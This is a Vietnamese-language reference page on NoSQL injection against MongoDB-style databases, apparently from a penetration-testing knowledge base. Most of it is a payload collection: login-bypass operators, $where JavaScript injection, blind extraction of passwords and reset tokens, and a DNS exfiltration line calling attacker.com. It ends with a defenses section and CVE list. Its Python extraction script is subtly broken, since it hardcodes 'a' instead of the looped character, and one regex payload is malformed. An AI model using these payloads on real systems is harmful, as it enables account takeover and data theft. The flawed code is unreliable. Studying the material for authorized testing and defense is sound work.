# NoSQL Injection

> Tiêm operator/JSON vào các truy vấn NoSQL (ví dụ MongoDB) để vượt qua logic hoặc xác thực. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/nosql.md`](../../../../Troubleshooting_Guide/nosql.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** NoSQLi · A03:2021 Injection
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
NoSQL injection xảy ra khi dữ liệu do kẻ tấn công kiểm soát làm thay đổi cấu trúc của một truy vấn
được gửi tới kho dữ liệu NoSQL (MongoDB, CouchDB, v.v.) thay vì chỉ được xử lý thuần túy như dữ
liệu. Vì nhiều driver NoSQL chấp nhận các đối tượng phong phú và các operator truy vấn, kẻ tấn công
có thể lén đưa vào các operator hoặc biểu thức JS để vượt qua xác thực, vượt qua logic, hoặc đọc dữ
liệu mà họ không được phép thấy.

## Cơ chế hoạt động (How it works)
Ứng dụng xây dựng truy vấn từ dữ liệu người dùng — thường bằng cách đưa thẳng request body hoặc
query string vào một đối tượng filter. Khi dữ liệu đó được phân tích như JSON hoặc theo ký pháp
mảng/dấu ngoặc, kẻ tấn công có thể thay một giá trị vô hướng bằng một operator truy vấn (`$ne`,
`$gt`, `$regex`, `$where`, `$or`), làm thay đổi phép so sánh mà cơ sở dữ liệu thực hiện. Trong
MongoDB, một giá trị rơi vào mệnh đề `$where` sẽ được đánh giá như JavaScript phía máy chủ, leo
thang từ injection thành thực thi biểu thức tùy ý. Nguyên nhân gốc giống hệt SQL injection: dữ liệu
không đáng tin bị trộn vào cấu trúc truy vấn mà không cưỡng chế kiểu.

## Tác động (Impact)
Vượt qua xác thực (đăng nhập với tư cách bất kỳ/không người dùng nào), vượt qua logic trên các filter
và kiểm tra quyền truy cập, và trích xuất các tài liệu cùng trường dữ liệu tùy ý qua oracle
boolean/regex. Ngữ cảnh `$where` và map-reduce cho phép thực thi JS phía máy chủ, có thể dẫn tới từ
chối dịch vụ (vòng lặp nặng) hoặc, trong một số triển khai, xâm nhập sâu hơn. Mức độ nghiêm trọng
thường là cao đến nghiêm trọng khi nó dẫn tới vượt xác thực hoặc rò rỉ dữ liệu hàng loạt.

## Cách phát hiện (How to detect)
- Gửi một operator truy vấn (ví dụ `username[$ne]=x` hoặc `{"username":{"$ne":""}}`) làm thay đổi
  phản hồi theo cách mà một chuỗi thuần không thể — một lần đăng nhập thành công, hoặc một danh sách
  trả về toàn bộ.
- Các phép thử boolean luôn-đúng so với luôn-sai tạo ra các phản hồi khác nhau, xác nhận đầu vào ảnh
  hưởng tới việc đánh giá truy vấn.
- Lỗi nhầm kiểu hoặc stack trace nhắc tới driver/BSON khi một mảng hoặc đối tượng được gửi vào nơi
  vốn mong đợi một chuỗi.
- Payload `$where`/regex gây khác biệt thời gian phản hồi đo lường được (oracle dựa trên thời gian).

## Khai thác (tóm tắt) (Exploitation)
Xác định xem đầu vào được phân tích như JSON hay theo ký pháp dấu ngoặc/mảng, rồi tiêm một operator
để lật một phép so sánh — `{"$ne":""}` để khớp bất kỳ mật khẩu nào, hoặc `$regex` để khớp một tiền
tố. Để đánh cắp dữ liệu, dùng oracle boolean hoặc regex để xác nhận từng ký tự một, đi qua
`Object.keys` để liệt kê các trường ẩn như token đặt lại. Nơi đầu vào tới được mệnh đề `$where`,
cung cấp một biểu thức JavaScript. Payload đầy đủ, các mẫu trích xuất mù, và tự động hóa nằm trong
phần Payload bên dưới và tài liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Phát hiện (phép thử boolean) (Detection (boolean probes))
Tiêm operator trong ngữ cảnh chuỗi, nơi một mệnh đề đúng/sai làm thay đổi phản hồi. So sánh một mệnh đề luôn-đúng với một mệnh đề luôn-sai để xác nhận.

```text
'||1||'
'||'1'=='1
' && 1 && '
" || 1==1 || "
' || 'a'=='a
" || true || "
```

### Vượt xác thực (operator JSON) (Authentication bypass (JSON operators))
Khi thông tin đăng nhập được phân tích như JSON, tiêm các operator để phép so sánh khớp bất kỳ/không giá trị nào.

```json
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$ne":"admin"},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$ne":"wrongpass"}}
{"username":{"$regex":"^admin$"},"password":{"$ne":""}}
{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$gt":""}}
```

### Tiêm operator qua cú pháp query/array (Operator injection via query/array syntax)
Khi body hoặc query string ánh xạ ký pháp dấu ngoặc thành một đối tượng, lén đưa vào các operator (`$ne`, `$gt`, `$lt`, `$regex`, `$where`, `$or`, `$in`).

```http
username[$ne]=admin
username[$regex]=^a
password[$regex]=^.{8}$
login[$where]="1==1"
find[$regex]=^.*
filter[$in]=["admin","user"]
```

Các operator tương đương có thể dùng bên trong một filter JSON:

```json
{"$where":"function(){return this.username=='admin'}()"}
{"$regex":".*"}
{"$exists":true}
{"$mod":[1,0]}
```

### Thực thi JavaScript qua `$where` của MongoDB (MongoDB `$where` JavaScript execution)
Ngữ cảnh chuỗi rơi vào bên trong một mệnh đề `$where` cho phép đánh giá JS tùy ý.

```javascript
' || this.password[0]=='a || '
' || Object.keys(this)[3]=='x || '
'; return true; //
'; return this.username=='admin'; //
1; return ''=='a
```

### Trích xuất mù (từng ký tự một) (Blind extraction (character-by-character))
Xác nhận từng ký tự một bằng cách dùng phản hồi như một oracle. Lặp `N` qua các vị trí và `X` qua tập ký tự.

```javascript
administrator' && this.password[0]=='a || 'a'=='b
administrator' && this.password[1]=='d || 'a'=='b
// pattern: administrator' && this.password[N]=='X || 'a'=='b
```

Các biến thể regex / `$where` của cùng oracle đó:

```javascript
' && this.password.match(/^a.*/).[0]=='a || 'x'=='x
administrator' && this.password.match('^a.*').length>0 || 'x'=='y
' || this.password.match('^a.*').length>0 || 'x'=='y
' || this.password[0]=='a || 'x'=='y
```

### Liệt kê trường / token ẩn (Hidden field / token enumeration)
Đi qua `Object.keys(this)` để phát hiện các trường không được tài liệu hóa, rồi đọc giá trị của chúng từng ký tự một.

```javascript
// discover field names by index
' || Object.keys(this)[0].match('^.{0}u.*').join('') || '
' || Object.keys(this)[1].match('^.{0}p.*').join('') || '
// generic: ' || Object.keys(this)[N].match('^.{P}c.*') || '

// read a known field's value
' || this.resetToken.match('^.{0}e.*') || '
' || this.resetToken.match('^.{1}e.*') || '
// pattern: ' || this.FIELD.match('^.{N}CHAR.*') || '
```

Các tên trường giá trị cao thường dò: `resetToken`, `pwResetTkn`, `unlockToken`, `inviteToken`, `secretKey`, `apiKey`, `accessToken`.

### Rò rỉ dữ liệu (Data exfiltration)
Kiểm tra dải bằng regex để xác nhận hình dạng giá trị; độ trễ thời gian và DNS cung cấp oracle out-of-band khi không có phản hồi hiển thị nào khác biệt.

```javascript
// shape / range checks
' && this.creditcard.match('^4.*').length>0 || 'x'=='y
' || this.email.match('.*@.*').length>0 || '

// time-based blind oracle
' || (function(){var x='a';for(i=0;i<100000;i++){x=x+'b'};return x.length>0})() || '

// DNS out-of-band
' || nslookup $(whoami).attacker.com || '
```

### Tự động hóa (trích xuất song song) (Automation (parallel extraction))
Exploit tham chiếu điều khiển việc trích xuất mù mật khẩu và trường ẩn với một worker pool.

```python
import requests, string, concurrent.futures

TARGET = "https://target.com/login"
CHARSET = string.ascii_lowercase + string.digits
WORKERS = 15

def extract_password():
    session = requests.Session()
    session.get(TARGET)
    password = ""
    for pos in range(50):
        for char in CHARSET:
            payload = f"administrator' && this.password[{pos}]=='a' || 'x'=='y"
            r = session.post(TARGET, data={"username":"admin","password":payload})
            if "Invalid" not in r.text:
                password += char
                break
    return password

def extract_field(position):
    field_value = ""
    for pos in range(100):
        for char in string.ascii_lowercase + string.digits:
            payload = f"' || Object.keys(this)[{position}].match('^.{{{pos}}}{char}.*') || 'x'=='y"
            r = requests.post(TARGET, data={"username":payload,"password":"x"})
            if "Invalid" not in r.text:
                field_value += char
                break
    return field_value
```

### Tham chiếu mục tiêu (Targeting reference)

| Mục tiêu | Tìm ở đâu / mẫu |
|------|-------------------------|
| Ký tự tại vị trí N | `^.{N}CHAR.*` |
| Bắt đầu bằng tiền tố | `^PREFIX.*` |
| Khớp đúng độ dài | `^.{LENGTH}$` |
| Endpoint có khả năng tiêm được | `/login`, `/forgot-password`, `/api/users`, `/api/search`, `/api/filter`, `/query` |

## Phòng chống (Defenses)
1. **Cưỡng chế kiểu đầu vào** tại biên — ép thông tin đăng nhập và ID về chuỗi/kiểu mong đợi và từ
   chối các đối tượng/mảng trước khi chúng tới truy vấn (bản vá chính; vô hiệu hóa tiêm operator).
2. **Xác thực bằng schema** (ví dụ JSON Schema, Mongoose với `strictQuery`) để các khóa bất ngờ như
   `$ne`/`$where` bị loại bỏ.
3. **Không bao giờ xây dựng truy vấn bằng nối chuỗi**, và **tắt JS phía máy chủ** (`$where`,
   map-reduce) khi có thể (`--noscripting` / `javascriptEnabled: false`).
4. Áp dụng tài khoản DB đặc quyền tối thiểu và thông báo lỗi chung chung để oracle rò rỉ ít hơn.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=NoSQL+Injection
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=NoSQL+Injection
- **Exploit-DB** — https://www.exploit-db.com/search?q=NoSQL+Injection
- **GitHub Advisories** — https://github.com/advisories?query=NoSQL+Injection
- **OSV** — https://osv.dev/list?q=NoSQL+Injection
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `NoSQL Injection <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2021-22911` — NoSQL injection trong Rocket.Chat ở phương thức `getPasswordPolicy`, dẫn tới
  trích xuất dữ liệu mù và chiếm tài khoản.
- `CVE-2019-10758` — Thực thi mã từ xa trong mongo-express qua đầu vào được tạo thủ công tới được
  việc đánh giá phía máy chủ.
- _Ví dụ kinh điển: lỗi vượt đăng nhập MongoDB được tài liệu hóa từ lâu dùng `{"$ne": null}` /
  `{"$gt": ""}` đối với các ứng dụng đưa thẳng request body vào truy vấn._

## Tham khảo (References)
- PortSwigger Web Security Academy — NoSQL injection.
- OWASP — Testing for NoSQL Injection (WSTG) & phần nhập môn NoSQL trong Injection Prevention Cheat Sheet.
- MongoDB Manual — Các operator truy vấn và việc đánh giá `$where` (ghi chú bảo mật).
